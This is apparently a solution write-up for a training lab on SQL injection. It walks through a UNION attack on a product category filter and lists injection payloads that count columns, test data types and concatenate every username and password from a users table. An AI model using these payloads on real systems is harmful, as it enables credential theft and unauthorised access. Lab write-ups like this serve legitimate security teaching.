
## Description:

this lab contains a SQL injection vulnerability in the product category filter, it is susceptible to UNION attacks

the database contains a table called 'users', with columns called 'username' and 'password'

to solve the lab perform a SQL injection UNION attack that retrieves all usernames and passwords in the same column and log in as the 'administrator' user

## Solution:

1.\ discovering how many columns are being returned

	' UNION SELECT NULL,NULL--
[trial and error until the application stops returning an error]

2.\ testing which column is returning a string compatible data type

	' UNION SELECT 'abc',NULL-- \\ Fails, the column is returning an integer
	' Union SELECT NULL,'abc'-- \\ Success

3.\ querying for the concatenated values of 'username' and 'password' parameters:

	' UNION SELECT NULL,concat(username,password) FROM users--
[concat() is used in postgresql, which was returned from a previous 'version()' ran in one of the parameters]

the || [double-pipe] concatenation operator can also be used in this case

	' UNION SELECT NULL,username||':'||password FROM users-- 

